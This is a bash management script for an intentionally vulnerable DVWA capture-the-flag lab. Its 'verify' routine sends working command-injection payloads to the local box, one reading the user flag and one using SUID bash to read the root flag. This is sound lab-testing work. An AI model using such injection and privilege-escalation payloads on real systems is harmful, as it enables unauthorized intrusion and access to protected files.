#!/usr/bin/env bash
#
# run.sh - helper for the DVWA-with-flags challenge box.
#
# Builds/starts the stack, resets it (regenerating the user & root flags), and
# tears it down including images and volumes.
#
set -euo pipefail

cd "$(dirname "$0")"

# Resolve the compose command: "docker compose" (v2) or "docker-compose" (v1).
if docker compose version >/dev/null 2>&1; then
    DC=(docker compose)
elif command -v docker-compose >/dev/null 2>&1; then
    DC=(docker-compose)
else
    echo "error: neither 'docker compose' nor 'docker-compose' is available" >&2
    exit 1
fi

SERVICE="dvwa"
BASE_URL="http://127.0.0.1:8383"
ENV_FILE=".env"
DEFAULT_LEVEL="low"

# Normalise + validate a difficulty argument. Echoes the canonical level, or
# fails with a message on stderr.
normalize_level() {
    local lvl
    lvl="$(printf '%s' "$1" | tr '[:upper:]' '[:lower:]')"
    case "$lvl" in
        low|medium|high|impossible) printf '%s' "$lvl" ;;
        *) echo "error: invalid difficulty '$1' (use: low | medium | high | impossible)" >&2
           return 1 ;;
    esac
}

# Current difficulty as persisted in .env (defaults to low when unset).
current_level() {
    if [ -f "$ENV_FILE" ] && grep -q '^DVWA_SECURITY_LEVEL=' "$ENV_FILE"; then
        sed -n 's/^DVWA_SECURITY_LEVEL=//p' "$ENV_FILE" | head -n1
    else
        printf '%s' "$DEFAULT_LEVEL"
    fi
}

# Persist the chosen difficulty in .env so every compose call (up/reset/level)
# sees it; compose interpolates it into the container's DEFAULT_SECURITY_LEVEL.
set_level() {
    local lvl="$1"
    if [ -f "$ENV_FILE" ]; then
        grep -v '^DVWA_SECURITY_LEVEL=' "$ENV_FILE" > "$ENV_FILE.tmp" 2>/dev/null || true
        mv "$ENV_FILE.tmp" "$ENV_FILE"
    fi
    printf 'DVWA_SECURITY_LEVEL=%s\n' "$lvl" >> "$ENV_FILE"
}

# Block until the app is up AND the DB is seeded (the fixed user/user account
# can log in), so callers know setup is complete. Non-zero on timeout.
wait_until_ready() {
    command -v curl >/dev/null 2>&1 || { sleep 8; return 0; }  # best effort w/o curl
    local jar tok code i=0
    jar="$(mktemp)"
    while [ "$i" -lt 60 ]; do
        i=$((i + 1))
        tok="$(curl -s -c "$jar" "$BASE_URL/login.php" 2>/dev/null \
            | sed -n "s/.*user_token' value='\([0-9a-f]\{32\}\).*/\1/p" | head -n1 || true)"
        if [ -n "$tok" ]; then
            curl -s -o /dev/null -b "$jar" -c "$jar" \
                --data "username=user" --data "password=user" --data "Login=Login" \
                --data "user_token=$tok" "$BASE_URL/login.php" 2>/dev/null || true
            code="$(curl -s -o /dev/null -w '%{http_code}' -b "$jar" \
                "$BASE_URL/vulnerabilities/exec/" 2>/dev/null || true)"
            if [ "$code" = "200" ]; then
                rm -f "$jar"
                return 0
            fi
        fi
        sleep 2
    done
    rm -f "$jar"
    return 1
}

usage() {
    cat <<'EOF'
Usage: ./run.sh <command> [args]

Commands:
  up [level]    Build + start the stack, wait until the database is fully
                seeded, and report. Optional difficulty (default: low):
                low | medium | high | impossible.
  level [lvl]   Show or change the difficulty. With no argument, prints the
                current level; with one, applies it (recreates the container).
  reset         Recreate the running container so the user & root flags are
                regenerated. Keeps the database volume and current difficulty.
                Use --hard to also wipe the database volume.
  clean         Stop and remove containers, the built image, and the volumes.
  flags         Print the current user and root flags from the running box.
  creds         Print the DVWA login credentials for this run.
  verify        End-to-end check: log in and capture both flags via command
                injection + privesc, then diff against the live files.
  status        Show the status of the stack.
  logs          Follow the container logs (Ctrl-C to stop).
  help          Show this help.

Examples:
  ./run.sh up                  # start at low difficulty (ready when it returns)
  ./run.sh up impossible       # start at impossible difficulty
  ./run.sh level medium        # switch a running box to medium
  ./run.sh reset               # new flags, DB + difficulty preserved
  ./run.sh clean               # remove everything this box created
EOF
}

is_up() {
    [ -n "$("${DC[@]}" ps -q "$SERVICE" 2>/dev/null)" ]
}

cmd_up() {
    local level
    if [ -n "${1:-}" ]; then
        level="$(normalize_level "$1")" || exit 1
    else
        level="$(current_level)"
    fi
    set_level "$level"

    echo "Building and starting DVWA at '$level' difficulty ..."
    "${DC[@]}" up -d --build

    printf 'Waiting for automatic database setup to finish ... '
    if wait_until_ready; then
        echo "ready."
    else
        echo "timed out."
        echo "The box may still be finishing setup; check './run.sh logs'." >&2
    fi

    echo
    echo "DVWA is up on $BASE_URL"
    echo "  difficulty     : $level   (change: ./run.sh level <low|medium|high|impossible>)"
    echo "  quick login    : user / user   (fixed every run)"
    echo "  all creds      : ./run.sh creds"
    echo "  flags          : ./run.sh flags"
    echo "  prove it works : ./run.sh verify"
}

cmd_level() {
    if [ -z "${1:-}" ]; then
        echo "Current difficulty: $(current_level)"
        echo "Change it with: ./run.sh level <low|medium|high|impossible>"
        return 0
    fi

    local level
    level="$(normalize_level "$1")" || exit 1
    set_level "$level"

    if ! is_up; then
        echo "Difficulty set to '$level'. Run './run.sh up' to start the box with it."
        return 0
    fi

    echo "Applying '$level' difficulty (recreating container; flags are regenerated) ..."
    "${DC[@]}" up -d --force-recreate "$SERVICE"
    printf 'Waiting for automatic database setup to finish ... '
    if wait_until_ready; then echo "ready."; else echo "timed out (check './run.sh logs')."; fi

    echo "Difficulty is now '$level'."
    echo "Note: an existing browser session keeps its own 'security' cookie - set it"
    echo "via DVWA > Security (or clear cookies) to pick up the new level there."
}

cmd_reset() {
    local hard="${1:-}"
    if [ "$hard" = "--hard" ]; then
        echo "Hard reset: recreating container and wiping the database volume..."
        "${DC[@]}" down --volumes --remove-orphans
        "${DC[@]}" up -d --build
    else
        if ! is_up; then
            echo "Container is not running; starting it fresh instead."
            cmd_up
            return
        fi
        echo "Resetting container (regenerating flags, keeping database)..."
        # --force-recreate replaces the container, so the entrypoint runs again
        # and both flags are regenerated.
        "${DC[@]}" up -d --force-recreate "$SERVICE"
    fi
    echo "Done. New flags are live."
}

cmd_clean() {
    echo "Removing containers, image, and volumes for this stack..."
    # --rmi local removes images built by this compose project.
    "${DC[@]}" down --rmi local --volumes --remove-orphans
    echo "Clean complete."
}

cmd_flags() {
    if ! is_up; then
        echo "error: the stack is not running. Start it with './run.sh up'." >&2
        exit 1
    fi
    echo "user flag: $("${DC[@]}" exec -T "$SERVICE" cat /var/www/user.txt)"
    echo "root flag: $("${DC[@]}" exec -T -u root "$SERVICE" cat /root/root.txt)"
}

cmd_creds() {
    if ! is_up; then
        echo "error: the stack is not running. Start it with './run.sh up'." >&2
        exit 1
    fi
    echo "DVWA login credentials for this run (user:password):"
    "${DC[@]}" exec -T -u root "$SERVICE" cat /var/www/dvwa-credentials.txt
    echo
    echo "The database is seeded automatically at launch, so these are live now."
    echo "Tip: 'user / user' is fixed every run; the rest are randomized."
}

cmd_verify() {
    # End-to-end smoke test of the challenge: log in as user/user over HTTP,
    # capture BOTH flags through DVWA's command-injection lab (user flag via
    # `cat`, root flag via the SUID-bash privesc), and diff them against the
    # live files inside the container. Uses a fresh cookie jar, so it always
    # runs at the configured default security level - independent of whatever
    # 'security' cookie a browser might have cached.
    if ! is_up; then
        echo "error: the stack is not running. Start it with './run.sh up'." >&2
        exit 1
    fi
    command -v curl >/dev/null 2>&1 || { echo "error: 'curl' is required on the host for 'verify'." >&2; exit 1; }

    # A missing flag means grep exits non-zero; that is an expected "FAIL"
    # outcome here, not a reason for the script's errexit to abort mid-check.
    set +e

    local base="http://127.0.0.1:8383"
    local jar pass=0 fail=0
    jar="$(mktemp)"
    trap 'rm -f "$jar"' RETURN

    extract_token() { sed -n "s/.*user_token' value='\([0-9a-f]\{32\}\).*/\1/p" | head -n1; }
    extract_flag()  { grep -oE 'flag\{[0-9a-f]{32}\}' | head -n1; }
    check() { # label  got  want
        if [ -n "$2" ] && [ "$2" = "$3" ]; then
            echo "  [PASS] $1: $2"; pass=$((pass + 1))
        else
            echo "  [FAIL] $1 (got: '${2:-<nothing>}', want: '${3:-?}')"; fail=$((fail + 1))
        fi
    }

    local level
    level="$(current_level)"
    echo "Running end-to-end verification against ${base} (difficulty: ${level}) ..."
    if [ "$level" != "low" ]; then
        echo "  note: this uses the low-level ';' command-injection payload; it is"
        echo "        expected to only succeed while the difficulty is 'low'."
    fi

    # 1. Authenticate as the fixed user/user account.
    local login_token
    login_token="$(curl -s -c "$jar" "$base/login.php" | extract_token)"
    curl -s -o /dev/null -b "$jar" -c "$jar" \
        --data "username=user" --data "password=user" --data "Login=Login" \
        --data "user_token=$login_token" "$base/login.php"
    # A logged-in session lands on index.php (200); an anonymous one is bounced.
    local logged_in
    logged_in="$(curl -s -o /dev/null -w '%{http_code}' -b "$jar" "$base/vulnerabilities/exec/")"
    if [ "$logged_in" = "200" ]; then
        echo "  [PASS] login as user/user"; pass=$((pass + 1))
    else
        echo "  [FAIL] login as user/user (exec page returned HTTP $logged_in)"; fail=$((fail + 1))
    fi

    # 2. Ground-truth flags straight from the container.
    local real_user real_root
    real_user="$("${DC[@]}" exec -T "$SERVICE" cat /var/www/user.txt 2>/dev/null | tr -d '\r\n')"
    real_root="$("${DC[@]}" exec -T -u root "$SERVICE" cat /root/root.txt 2>/dev/null | tr -d '\r\n')"

    # 3. User flag via command injection (proves low.php is being served).
    local got_user
    got_user="$(curl -s -b "$jar" -c "$jar" \
        --data-urlencode "ip=127.0.0.1; cat /var/www/user.txt" \
        --data "Submit=Submit" "$base/vulnerabilities/exec/" | extract_flag)"
    check "user flag via command injection" "$got_user" "$real_user"

    # 4. Root flag via SUID-bash privilege escalation.
    local got_root
    got_root="$(curl -s -b "$jar" -c "$jar" \
        --data-urlencode "ip=127.0.0.1; /bin/bash -pc 'cat /root/root.txt'" \
        --data "Submit=Submit" "$base/vulnerabilities/exec/" | extract_flag)"
    check "root flag via SUID bash privesc" "$got_root" "$real_root"

    echo
    if [ "$fail" -eq 0 ]; then
        echo "RESULT: VULNERABLE as intended - $pass/$((pass + fail)) checks passed."
    else
        echo "RESULT: $fail check(s) FAILED ($pass passed). The box is not behaving as expected." >&2
        return 1
    fi
}

cmd_status() {
    "${DC[@]}" ps
}

cmd_logs() {
    "${DC[@]}" logs -f "$SERVICE"
}

if [ "$#" -eq 0 ]; then
    usage >&2
    exit 1
fi

case "$1" in
    up)      cmd_up "${2:-}" ;;
    level)   cmd_level "${2:-}" ;;
    reset)   cmd_reset "${2:-}" ;;
    clean)   cmd_clean ;;
    flags)   cmd_flags ;;
    creds)   cmd_creds ;;
    verify)  cmd_verify ;;
    status)  cmd_status ;;
    logs)    cmd_logs ;;
    help|usage|-h|--help) usage ;;
    *)
        echo "error: unknown command '$1'" >&2
        echo >&2
        usage >&2
        exit 1
        ;;
esac
